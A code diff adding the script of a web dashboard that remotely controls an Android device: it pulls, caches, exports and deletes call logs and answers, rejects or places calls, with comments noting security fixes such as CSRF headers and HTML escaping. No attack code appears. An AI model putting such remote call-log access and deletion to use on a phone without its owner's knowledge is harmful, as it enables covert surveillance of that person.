+        dialInput.addEventListener('keydown', function (e) {
+            var dropdown = document.getElementById('dial-suggestions');
+            var items = dropdown.querySelectorAll('.dial-suggestion');
+            if (e.key === 'ArrowDown') { e.preventDefault(); activeSuggestionIndex = Math.min(activeSuggestionIndex + 1, items.length - 1); updateActiveSuggestion(items); }
+            else if (e.key === 'ArrowUp') { e.preventDefault(); activeSuggestionIndex = Math.max(activeSuggestionIndex - 1, -1); updateActiveSuggestion(items); }
+            else if (e.key === 'Enter') { e.preventDefault(); if (activeSuggestionIndex >= 0 && items[activeSuggestionIndex]) { var el = items[activeSuggestionIndex]; selectSuggestion(el.dataset.number, el.dataset.name); } else { dialNumber(); } }
+            else if (e.key === 'Escape') { dropdown.classList.remove('visible'); }
+        });
+        document.addEventListener('click', function (e) { if (!e.target.closest('.dial-search-wrap')) document.getElementById('dial-suggestions').classList.remove('visible'); });
+        function updateActiveSuggestion(items) {
+            items.forEach(function (el, i) { el.classList.toggle('active', i === activeSuggestionIndex); });
+            if (activeSuggestionIndex >= 0 && items[activeSuggestionIndex]) items[activeSuggestionIndex].scrollIntoView({ block: 'nearest' });
+        }
+        connectCallWebSocket();
+
+        // ========== CALL LOGS ==========
+        // CALL-BUG-2: replaced raw XHR (no CSRF) with api.sendCommand
+        async function fetchLogs(limit) {
+            var response = await api.sendCommand(deviceId, 'call_logs', { limit: limit });
+            var logs = [];
+            if (response && response.data) {
+                if (Array.isArray(response.data)) logs = response.data;
+                else if (Array.isArray(response.data.data)) logs = response.data.data;
+            }
+            if (logs.length > 0) {
+                // CALL-BUG-10: cache POST now includes CSRF header via api.csrfToken
+                fetch('/api/device/' + deviceId + '/call-logs/cache', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': api.csrfToken || '' },
+                    body: JSON.stringify({ logs: logs })
+                }).catch(function () { });
+            }
+            return logs;
+        }
+
+        function fetchCachedLogs() {
+            return fetch('/api/device/' + deviceId + '/call-logs')
+                .then(function (r) { return r.json(); })
+                .then(function (json) { if (json.success && json.logs && json.logs.length > 0) return { logs: json.logs, source: json.source }; return null; })
+                .catch(function () { return null; });
+        }
+
+        function loadPage(page) {
+            if (isLoading) return;
+            isLoading = true;
+            var container = document.getElementById('logs-container');
+            container.innerHTML = '<div class="empty"><div class="e-icon pulse-load"><i data-lucide="phone" style="width:48px;height:48px;"></i></div><h2>Loading Page ' + page + '</h2><p>Fetching logs...</p></div>';
+            lucide.createIcons();
+
+            var neededCount = page * PAGE_SIZE;
+            if (neededCount > allLogs.length && hasMore) {
+                fetchLogs(neededCount).then(function (logs) {
+                    if (logs.length < neededCount) hasMore = false;
+                    allLogs = logs;
+                    currentPage = page;
+                    document.getElementById('log-count').style.display = 'inline-block';
+                    document.getElementById('log-count').textContent = allLogs.length + (hasMore ? '+' : '');
+                    document.getElementById('filter-bar').style.display = 'flex';
+                    renderTable(); updatePagination(); isLoading = false;
+                }).catch(function (err) {
+                    fetchCachedLogs().then(function (cached) {
+                        if (cached && cached.logs.length > 0) {
+                            allLogs = cached.logs; hasMore = false; currentPage = 1;
+                            document.getElementById('log-count').style.display = 'inline-block';
+                            document.getElementById('log-count').textContent = allLogs.length;
+                            document.getElementById('filter-bar').style.display = 'flex';
+                            var src = cached.source === 'database' ? 'database' : 'cache';
+                            document.getElementById('stats').innerHTML = '<span style="color:var(--accent);display:flex;align-items:center;gap:6px;"><i data-lucide="database" style="width:14px;height:14px;"></i> Showing cached logs (from ' + src + '). Device is offline.</span>';
+                            lucide.createIcons();
+                            renderTable(); updatePagination();
+                        } else { showError(err.message || err); }
+                        isLoading = false;
+                    });
+                });
+            } else {
+                currentPage = page; renderTable(); updatePagination(); isLoading = false;
+            }
+        }
+
+        function updatePagination() {
+            var pagination = document.getElementById('pagination');
+            pagination.style.display = 'flex';
+            document.getElementById('prev-btn').disabled = currentPage <= 1;
+            document.getElementById('next-btn').disabled = !hasMore && currentPage >= Math.ceil(allLogs.length / PAGE_SIZE);
+            var from = (currentPage - 1) * PAGE_SIZE + 1;
+            var showing = Math.min(currentPage * PAGE_SIZE, allLogs.length);
+            document.getElementById('page-info').innerHTML = 'Page ' + currentPage + ' <span style="opacity:0.5;font-size:0.8em">(' + from + '-' + showing + ')</span>';
+        }
+
+        function prevPage() { if (currentPage > 1) loadPage(currentPage - 1); }
+        function nextPage() { loadPage(currentPage + 1); }
+
+        function showError(msg) {
+            document.getElementById('logs-container').innerHTML =
+                '<div class="empty"><div class="e-icon"><i data-lucide="alert-circle" style="width:48px;height:48px;color:var(--danger);"></i></div><h2>' + msg + '</h2><p><button class="hdr-btn" style="margin-top:12px;" onclick="loadPage(1)"><i data-lucide="refresh-cw" style="width:14px;height:14px;"></i> Retry</button></p></div>';
+            lucide.createIcons();
+        }
+
+        function getTypeInfo(type) {
+            if (type.includes('INCOMING')) return { icon: 'phone-incoming', cls: 'incoming', label: 'Incoming' };
+            if (type.includes('OUTGOING')) return { icon: 'phone-outgoing', cls: 'outgoing', label: 'Outgoing' };
+            if (type.includes('MISSED')) return { icon: 'phone-missed', cls: 'missed', label: 'Missed' };
+            return { icon: 'phone', cls: 'other', label: type };
+        }
+
+        function renderTable() {
+            var container = document.getElementById('logs-container');
+            var filtered = activeFilter === 'ALL' ? allLogs : allLogs.filter(function (l) { return l.type.includes(activeFilter); });
+
+            if (filtered.length === 0) {
+                container.innerHTML = '<div class="empty"><div class="e-icon"><i data-lucide="phone-off" style="width:48px;height:48px;"></i></div><h2>No Call Logs Found</h2></div>';
+                lucide.createIcons();
+                document.getElementById('pagination').style.display = 'none';
+                document.getElementById('stats').innerHTML = '';
+                return;
+            }
+
+            var startIndex = (currentPage - 1) * PAGE_SIZE;
+            var pageLogs = filtered.slice(startIndex, startIndex + PAGE_SIZE);
+
+            var html = '<div class="log-table-wrap"><table class="log-table">' +
+                '<thead><tr><th>Name / Number</th><th>Type</th><th>Date</th><th>Duration</th><th></th></tr></thead><tbody>';
+
+            pageLogs.forEach(function (log) {
+                var t = getTypeInfo(log.type);
+                // CALL-BUG-3: use global escHtml instead of removed local escapeHtml
+                var nameDisplay = log.name
+                    ? '<span class="name">' + escHtml(log.name) + '</span><br><span class="num">' + escHtml(log.number) + '</span>'
+                    : '<span class="num" style="color:var(--text-primary);">' + escHtml(log.number) + '</span>';
+
+                // CALL-BUG-4: use data-id attribute instead of injecting id into onclick string
+                html += '<tr id="log-row-' + escHtml(String(log.id)) + '"><td>' + nameDisplay + '</td>' +
+                    '<td><span class="type-badge ' + t.cls + '"><i data-lucide="' + t.icon + '" style="width:11px;height:11px;"></i> ' + t.label + '</span></td>' +
+                    '<td style="font-family:var(--font-mono);font-size:0.7rem;">' + escHtml(log.date) + '</td>' +
+                    '<td style="font-family:var(--font-mono);">' + log.duration + 's</td>' +
+                    '<td><button class="btn-del-log" data-id="' + escHtml(String(log.id)) + '"><i data-lucide="trash-2" style="width:12px;height:12px;"></i></button></td></tr>';
+            });
+
+            html += '</tbody></table></div>';
+            container.innerHTML = html;
+            lucide.createIcons();
+            document.getElementById('stats').innerHTML = 'Showing <strong>' + pageLogs.length + '</strong> of <strong>' + filtered.length + (hasMore ? '+' : '') + '</strong> call logs';
+        }
+
+        // CALL-BUG-7: use data-type attribute on filter buttons for reliable matching
+        function filterType(type) {
+            activeFilter = type;
+            currentPage = 1;
+            document.querySelectorAll('.filter-btn').forEach(function (btn) {
+                btn.classList.toggle('active', btn.dataset.type === type);
+            });
+            renderTable();
+            updatePagination();
+        }
+
+        async function exportLogs() {
+            // CALL-BUG-5: Android returns { status, path, count } — server resolves to that object directly
+            try {
+                const data = await api.sendCommand(deviceId, 'call_logs_export', { format: 'csv' });
+                const exportPath = data && data.path;
+                if (exportPath) { api.downloadFile(deviceId, exportPath); api.showToast('Exporting call logs...', 'success'); }
+                else { throw new Error('Export failed — no path returned'); }
+            } catch (error) { api.showToast(error.message, 'error'); }
+        }
+
+        async function deleteLog(id, btn) {
+            if (!confirm('Delete this call log entry?')) return;
+            btn.disabled = true;
+            btn.innerHTML = '<i data-lucide="loader" style="width:12px;height:12px;" class="spin"></i>';
+            lucide.createIcons();
+            try {
+                await api.sendCommand(deviceId, 'call_log_delete', { id: id });
+                // CALL-BUG-4: row id now uses 'log-row-' prefix to match renderTable
+                var row = document.getElementById('log-row-' + id);
+                if (row) row.remove();
+                allLogs = allLogs.filter(function (l) { return String(l.id) !== String(id); });
+                api.showToast('Call log deleted', 'success');
+            } catch (e) {
+                api.showToast('Delete failed: ' + e.message, 'error');
+                btn.disabled = false;
+                btn.innerHTML = '<i data-lucide="trash-2" style="width:12px;height:12px;"></i>';
+                lucide.createIcons();
+            }
+        }
+
+        // CALL-BUG-4: event delegation for delete buttons (data-id instead of onclick)
+        document.getElementById('logs-container').addEventListener('click', function (e) {
+            var btn = e.target.closest('.btn-del-log[data-id]');
+            if (btn) deleteLog(btn.dataset.id, btn);
+        });
+
+        // CALL-BUG-6: close callWs on page unload to stop reconnect loop
+        window.addEventListener('beforeunload', function () {
+            if (callWs) { callWs.onclose = null; callWs.close(); }
+        });
+
+        // CALL-BUG-8: expose all functions used in static HTML onclick attributes
+        window.dialNumber = dialNumber;
+        window.exportLogs = exportLogs;
+        window.filterType = filterType;
+        window.prevPage = prevPage;
+        window.nextPage = nextPage;
+        window.answerCall = answerCall;
+        window.rejectCall = rejectCall;
+        window.endCall = endCall;
+        window.toggleSpeaker = toggleSpeaker;
+        window.deleteLog = deleteLog;
+
+        loadPage(1);
+    </script>
+</body>
+
+</html>
